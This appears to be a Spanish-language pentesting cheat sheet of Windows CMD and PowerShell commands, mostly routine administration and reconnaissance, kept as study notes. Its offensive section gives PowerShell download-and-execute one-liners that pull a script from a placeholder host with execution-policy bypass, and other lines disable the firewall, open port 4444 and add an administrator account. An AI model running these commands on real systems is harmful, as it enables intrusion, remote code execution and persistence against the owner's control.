# Windows — CMD y PowerShell

> Comandos esenciales de Windows para pentesting.

---

## CMD básico

```cmd
whoami                           # Usuario actual
hostname                         # Nombre del equipo
ipconfig                         # Configuración de red
ipconfig /all                    # Info completa
ipconfig /flushdns              # Limpiar DNS
systeminfo                       # Info del sistema
tasklist                         # Procesos activos
tasklist /svc                    # Procesos con servicios
net user                         # Usuarios
net user <user>                  # Info de usuario
net localgroup administrators    # Grupo admin
net share                        # Shares compartidos
netstat -ano                     # Puertos abiertos
```

## Servicios

```cmd
net start                        # Servicios iniciados
net stop <service>               # Detener servicio
sc query                         # Servicios
sc qc <service>                  # Config de servicio
wmic service list brief          # Lista de servicios
```

## Firewall

```cmd
netsh advfirewall show allprofiles  # Ver firewall
netsh advfirewall set allprofiles state off  # Desactivar
netsh advfirewall firewall add rule name="Open" dir=in action=allow protocol=TCP localport=4444
```

## Usuarios y grupos

```cmd
net user <user> /add             # Crear usuario
net localgroup administrators <user> /add  # Añadir a admin
net user <user> <pass> /add      # Crear con contraseña
net user <user> /active:yes      # Activar usuario
```

## Archivos

```cmd
dir /s /b                        # Listar recursivamente
type <file>                      # Ver contenido
copy <src> <dst>                 # Copiar
move <src> <dst>                 # Mover
del <file>                       # Eliminar
mkdir <dir>                      # Crear directorio
icacls <file>                    # Permisos NTFS
takeown /f <file>                # Tomar propietario
```

## PowerShell básico

```powershell
Get-ChildItem                    # Listar archivos (ls)
Get-Content <file>               # Ver contenido (cat)
Set-Content <file> "text"        # Escribir archivo
Copy-Item <src> <dst>            # Copiar
Remove-Item <file>               # Eliminar
Get-Service                      # Servicios
Get-Process                      # Procesos
Get-NetIPAddress                 # IPs
Get-NetTCPConnection             # Conexiones TCP
Invoke-WebRequest <url>          # HTTP request
```

## PowerShell ofensivo

```powershell
# Descargar archivo
IEX (New-Object Net.WebClient).DownloadString('http://IP/script.ps1')
Invoke-WebRequest http://IP/file -OutFile C:\temp\file

# Ejecutar en memoria
powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://IP/shell.ps1')"

# Bypass execution policy
Set-ExecutionPolicy Bypass -Scope Process
```

## Reconocimiento

```cmd
systeminfo                       # Info del sistema
wmic qfe list brief              # Parches instalados
wmic product list brief          # Software instalado
wmic startup list full           # Programas de inicio
net config workstation            # Info de estación
nltest /dclist:                  # Controladores de dominio
```

## Equivalencias CMD ↔ Linux

```cmd
dir /a                           # Listar (incl. ocultos)
dir /s *.txt                     # Recursivo
findstr "texto" fichero          # grep
doskey /history                  # history
cls                              # clear
rd /s /q <dir>                   # rm -rf (sin alertas)
pushd <ruta> / popd              # guardar/volver de directorio
whoami /all                      # usuario + SID + grupos + privilegios
whoami /priv                     # solo privilegios (SeImpersonatePrivilege)
whoami /groups                   # grupos
```









---

## 🔗 Red de Conocimiento

### Documentos Relacionados

- [[Tmux.md|Tmux]] — Linux, Linux, Metodologia Pentest
- [[../../comandos/Windows.md|Windows]] — Linux, Linux, Metodologia Pentest
- [[SMB_Impacket.md|SMB_Impacket]] — Linux, Linux, Metodologia Pentest
- [[../../apuntes Chema/Migrar una Máquina Virtual de VirtualBox a VMware Workstation.md|Migrar una Máquina Virtual de VirtualBox a VMware Workstation]] — Linux, Linux, Metodologia Pentest
- [[../../apuntes evolve/BLOQUE 10.md|BLOQUE 10]] — Linux, Linux, Metodologia Pentest

### 🌐 Cross-Dominio

- [[../../../programacion/Arduino/librerias_arduino.md|librerias_arduino]] — Programacion: Linux, Redes
- [[../../../redes/vlans_segmentacion.md|vlans_segmentacion]] — Redes: Linux, Redes

> #linux #linux_ciber #pentest #redes #tmux #windows_ciber
